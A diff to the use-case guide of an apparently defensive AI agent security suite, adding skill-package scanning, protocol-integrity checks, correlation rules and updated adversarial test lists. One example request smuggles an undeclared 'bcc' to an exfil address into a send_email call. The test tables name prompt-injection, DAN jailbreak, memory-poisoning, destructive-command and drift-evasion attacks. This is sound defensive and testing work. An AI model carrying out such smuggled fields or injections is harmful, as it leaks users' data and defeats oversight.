@@ -1,6 +1,6 @@
 # ML-Redteam Security Suite — Use Case Guide
 
-**Version:** 2.4 | **Date:** 2026-03-20
+**Version:** 2.6 | **Date:** 2026-04-07
 **Components:** Tessera (Identity) + VerityFlux (Verification) + Vestigia (Evidence)
 
 ---
@@ -382,6 +382,55 @@ curl -X POST http://localhost:8003/api/v1/scans/start \
 - Valid API key for the target provider (for real mode)
 - Target endpoint must be reachable from the VerityFlux server
 
+### 3.2.1 Skill Security Assessment
+
+**Use Case:** Assess a skill package or manifest before installation or activation, covering the skill layer against AST01-AST10 style risks.
+
+**Supported formats:**
+- `SKILL.md`
+- `skill.json`
+- `manifest.json`
+- `package.json`
+
+**Via Dashboard:**
+1. Open VerityFlux UI → Scanner tab → Skill Security
+2. Upload one or more skill files, or paste a manifest directly
+3. Select the primary manifest file and optional platform hint
+4. Click `Assess Skill Package`
+5. Review:
+   - overall risk score and severity
+   - AST finding list with evidence and recommendations
+   - suite control mapping for Tessera, VerityFlux, and Vestigia
+   - stored assessment history and AST10 coverage matrix
+
+**Via API:**
+```bash
+curl -X POST http://localhost:8003/api/v2/skills/assess \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: vf_admin_demo_key" \
+  -H "Authorization: Bearer vf_admin_demo_key" \
+  -d '{
+    "name": "demo-skill",
+    "primary_filename": "skill.json",
+    "platform": "claude_code",
+    "source": "manual",
+    "content": "{\"name\":\"demo-skill\",\"version\":\"1.0.0\",\"permissions\":{\"tools\":[\"web_fetch\"]}}",
+    "supporting_files": {
+      "README.md": "optional supporting file contents"
+    }
+  }'
+```
+
+**Additional endpoints:**
+- `GET /api/v2/skills/assessments`
+- `GET /api/v2/skills/assessments/{assessment_id}`
+- `GET /api/v2/skills/gap-matrix`
+
+**Cross-plane wiring:**
+- VerityFlux performs the assessment and stores the result.
+- Tessera is referenced in the returned control mapping for least-privilege, approval, and containment actions.
+- Vestigia receives assessment-completed events through the integration pipeline for evidence continuity.
+
 ### 3.3 Agentic Workflow Fuzzing (3 Detectors)
 
 **Use Case:** Test whether an AI agent properly handles adversarial workflow scenarios like contradictory instructions, social engineering, and safety step manipulation.
@@ -461,6 +510,50 @@ curl -X POST http://localhost:8003/api/v1/scans/start \
 ```
 
 This produces **27 tests** (20 OWASP + 3 fuzz + 4 MCP).
+
+### 3.4.1 Protocol Integrity Analysis
+
+**Use Case:** Inspect structured tool-call or agent-to-agent message envelopes for protocol-layer failures before execution. This covers schema drift, field smuggling, contract desynchronization, and multi-hop trust collapse.
+
+**Via API:**
+```bash
+curl -X POST http://localhost:8003/api/v2/mcp/protocol-integrity/analyze \
+  -H "Content-Type: application/json" \
+  -d '{
+    "tool_name": "send_email",
+    "arguments": {
+      "to": "user@example.com",
+      "subject": "Quarterly update",
+      "body": "Attached is the report.",
+      "bcc": "exfil@example.com"
+    },
+    "protocol": "mcp",
+    "schema_version": "1",
+    "contract_id": "send_email:v1",
+    "metadata": {
+      "declared_fields": ["to", "subject", "body"],
+      "tool_alias": "send_email"
+    },
+    "route": [
+      {"from": "planner", "to": "mail-agent", "authenticated": true},
+      {"from": "mail-agent", "to": "smtp-bridge", "authenticated": false}
+    ]
+  }'
+```
+
+**Response highlights:**
+- `severity` — overall protocol-integrity severity
+- `finding_count` — number of protocol findings
+- `findings[]` — typed findings such as `field_smuggling` or `trust_collapse`
+- `recommendations[]` — corrective actions for the operator
+
+**Runtime path:** the same analysis also runs automatically in `POST /api/v2/intercept/tool-call`. High-risk protocol findings can escalate or block execution before the tool call runs.
+
+**Via Dashboard:**
+1. Open VerityFlux UI
+2. Navigate to **MCP Security**
+3. Open the **Protocol Integrity** sub-tab
+4. Review assessed message count, live alert count, and recent findings
 
 ### 3.5 Viewing Scan Results
 
@@ -788,7 +881,7 @@ The Streamlit dashboard provides these tabs:
 | Cognitive Firewall | Real-time firewall activity logs |
 | Reasoning Interceptor | View intercepted CoT blocks and decisions |
 | Session Drift Monitor | Per-session drift graphs and alerts |
-| MCP Security | Tool manifest signing status and rug-pull alerts |
+| MCP Security | Tool manifest signing, rug-pull alerts, schema validation, and protocol integrity alerts |
 | AIBOM Viewer | Component inventory and verification timeline |
 | Delegation Chain Viewer | Token delegation tree and effective scopes |
 | Fuzz Test Results | Workflow fuzzing scan results |
@@ -927,20 +1020,26 @@ The EventCorrelator automatically detects these patterns:
 | Rapid token after threat | HIGH | A new token was issued within 60s of a threat detection — possible attacker pivoting |
 | Delegation after drift | CRITICAL | A delegation was created within 120s of a session drift alert — possible escalation |
 | Manifest fail then execution | CRITICAL | A tool was executed within 30s of its manifest verification failing — possible rug-pull |
+| Protocol alert then execution | CRITICAL | A tool was executed within 45s of a protocol-integrity alert — possible contract bypass or unsafe handoff |
+| A2A reasoning alert then execution | CRITICAL | A tool was executed within 45s of an A2A reasoning contamination alert — possible unsafe inherited handoff logic |
+| Cross-agent memory alert then execution | CRITICAL | A tool was executed within 45s of a cross-agent memory poisoning alert — possible unsafe shared-memory propagation |
 
 **Via Dashboard:** Navigate to the SIEM Alerts tab to see correlated anomaly alerts.
 
 ### 4.9 Enterprise ActionTypes
 
-Vestigia tracks 13 enterprise ActionTypes across the suite:
+Vestigia tracks 16 enterprise ActionTypes across the suite:
 
 | ActionType | Source | Trigger |
 |-----------|--------|---------|
 | `REASONING_INTERCEPTED` | VerityFlux | CoT block intercepted |
+| `REASONING_A2A_ALERT` | VerityFlux | Inherited reasoning from another agent contained unsafe or unvalidated control content |
 | `RATIONALIZATION_PERFORMED` | VerityFlux | Oversight model evaluated action |
 | `MEMORY_FILTERED` | VerityFlux | RAG retrievals sanitized |
+| `MEMORY_CROSS_AGENT_ALERT` | VerityFlux | Shared-memory retrieval from another agent or shared store carried poisoning signals |
 | `ADVERSARIAL_SCORED` | VerityFlux | Input hostility scored |
 | `SESSION_DRIFT_ALERT` | VerityFlux | Session drift exceeded threshold |
+| `PROTOCOL_INTEGRITY_ALERT` | VerityFlux | Protocol-integrity analysis found a high-risk message or route defect |
 | `TOOL_MANIFEST_VERIFIED` | VerityFlux | Manifest verification passed |
 | `TOOL_MANIFEST_FAILED` | VerityFlux | Manifest verification failed |
 | `DELEGATION_CREATED` | Tessera | Delegated token issued |
@@ -1041,12 +1140,12 @@ Three test suites validate the suite at different layers — from API plumbing t
 
 ```bash
 # Start all services
-./start_suite.sh
+./launch_suite.sh
 
-# 1. Functional plumbing (61 tests)
+# 1. Functional plumbing (68 tests)
 python test_suite_complete.py
 
-# 2. Adversarial efficacy (38 tests)
+# 2. Adversarial efficacy (42 tests)
 python test_adversarial_efficacy.py
 
 # 3. E2E scenarios (28 steps)
@@ -1057,14 +1156,14 @@ python test_e2e_scenarios.py
 
 **Use Case:** Validate that all API endpoints across all three services respond correctly. This is a regression check — it tests plumbing, not detection quality.
 
-**Coverage:** 61 tests across 12 sections:
+**Coverage:** 68 tests across 12 sections:
 - **A:** Service Health (3) — all services return healthy
-- **B:** Tessera Identity (12) — full agent CRUD + token lifecycle
+- **B:** Tessera Identity (15) — full agent CRUD + token lifecycle
 - **C:** Tessera Delegation (5) — inter-agent token delegation + scope narrowing
 - **D:** VerityFlux Agent Onboarding (4) — SOC agent registration + quarantine
 - **E:** VerityFlux Scanning Mock (6) — mock scan lifecycle + findings
 - **F:** VerityFlux Scanning Ollama (4) — real LLM scan (auto-skip if no Ollama)
-- **G:** VerityFlux Runtime Enforcement (8) — reasoning, tool calls, memory, adversarial scoring
+- **G:** VerityFlux Runtime Enforcement (12) — reasoning, A2A CoT contamination, tool calls, memory, cross-agent memory poisoning, protocol integrity, adversarial scoring
 - **H:** VerityFlux Session Drift (3) — drift tracking + escalation
 - **I:** VerityFlux Tool Manifest & AIBOM (4) — sign/verify manifests + AIBOM
 - **J:** VerityFlux Policy (2) — get/reload policy
@@ -1075,14 +1174,14 @@ python test_e2e_scenarios.py
 
 **Use Case:** Validate that security detections actually catch real attacks — not just that APIs respond with 200.
 
-**Coverage:** 38 tests across 8 sections:
+**Coverage:** 42 tests across 8 sections:
 
 | Section | Tests | What It Validates |
 |---------|-------|-------------------|
 | **A. Prompt Injection** | 6 | Direct override, DAN jailbreak, base64 evasion, context manipulation, benign (false positive check), multilingual injection |
-| **B. Tool Call Security** | 6 | `rm -rf /`, SQL injection, path traversal, credential exfiltration, benign read (allow check), shutdown command |
-| **C. Reasoning Interception** | 5 | Safety bypass intent, benign reasoning, ignore instructions, cooking (benign), circumvent/jailbreak |
-| **D. Memory Poisoning** | 5 | `[HIDDEN:]` injection, HTML comment override, credential in retrieval, clean passthrough, fake authorization |
+| **B. Tool Call Security** | 8 | `rm -rf /`, SQL injection, path traversal, credential exfiltration, benign read (allow check), shutdown command, field smuggling, multi-hop trust collapse |
+| **C. Reasoning Interception** | 6 | Safety bypass intent, benign reasoning, ignore instructions, cooking (benign), circumvent/jailbreak, inherited A2A CoT contamination |
+| **D. Memory Poisoning** | 6 | `[HIDDEN:]` injection, HTML comment override, credential in retrieval, clean passthrough, fake authorization, cross-agent shared-memory poisoning |
 | **E. Session Drift** | 4 | Stable benign, gradual crescendo, sawtooth evasion, sudden topic switch |
 | **F. Scanner Mock** | 4 | Findings count, severity distribution, risk scores, LLM + agentic categories |
 | **G. Scanner Ollama** | 3 | Scan completes, real findings, meaningful evidence (auto-skip if no Ollama) |
